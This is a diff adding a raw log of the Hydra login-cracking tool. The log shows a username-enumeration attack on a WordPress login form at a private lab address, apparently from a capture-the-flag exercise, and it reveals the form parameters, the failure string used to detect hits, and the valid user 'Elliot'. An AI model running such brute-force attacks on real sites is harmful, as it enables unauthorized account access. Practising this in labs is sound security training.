@@ -1,0 +1,13 @@
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-12 22:29:59
+[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:11452/p:1), ~716 tries per task
+[DATA] attacking http-post-form://10.10.39.226:80/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username
+[STATUS] 1034.00 tries/min, 1034 tries in 00:01h, 10418 to do in 00:11h, 16 active
+[STATUS] 675.00 tries/min, 2025 tries in 00:03h, 9427 to do in 00:14h, 16 active
+[STATUS] 630.86 tries/min, 4416 tries in 00:07h, 7036 to do in 00:12h, 16 active
+[80][http-post-form] host: 10.10.39.226   login: Elliot   password: test
+[80][http-post-form] host: 10.10.39.226   login: ELLIOT   password: test
+[80][http-post-form] host: 10.10.39.226   login: elliot   password: test
+[STATUS] 602.00 tries/min, 7224 tries in 00:12h, 4228 to do in 00:08h, 16 active
